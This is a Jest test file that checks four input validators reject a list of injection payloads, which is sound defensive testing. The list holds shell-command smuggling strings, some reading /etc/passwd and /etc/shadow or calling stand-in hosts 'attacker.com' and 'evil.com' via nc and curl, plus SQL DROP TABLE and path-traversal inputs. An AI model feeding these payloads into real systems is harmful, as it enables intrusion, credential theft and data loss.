/**
 * Integration-style tests verifying injection payloads are rejected at validation layer
 */
const { validateTenantId, validateBackupId, validateBotName, validateEmail } = require('../api-local/util/validate.js');

const INJECTION_PAYLOADS = [
  'foo; cat /etc/passwd',
  'foo && echo pwned',
  'foo || echo pwned',
  'foo | nc attacker.com 1234',
  'foo`whoami`',
  'foo$(id)',
  '$(curl http://evil.com)',
  'foo\n whoami',
  'foo\r\ninjected',
  '../../../etc/shadow',
  'foo > /tmp/pwned',
  'foo < /dev/null',
  "foo'; DROP TABLE users; --",
  'foo\\$(id)',
  '${IFS}cat${IFS}/etc/passwd',
  'foo\x00bar',
];

describe('Injection payloads rejected by all validators', () => {
  for (const payload of INJECTION_PAYLOADS) {
    test(`tenantId rejects: ${JSON.stringify(payload)}`, () => {
      expect(validateTenantId(payload)).toBe(false);
    });

    test(`backupId rejects: ${JSON.stringify(payload)}`, () => {
      expect(validateBackupId(payload)).toBe(false);
    });

    test(`botName rejects: ${JSON.stringify(payload)}`, () => {
      expect(validateBotName(payload)).toBe(false);
    });

    test(`email rejects: ${JSON.stringify(payload)}`, () => {
      expect(validateEmail(payload)).toBe(false);
    });
  }
});
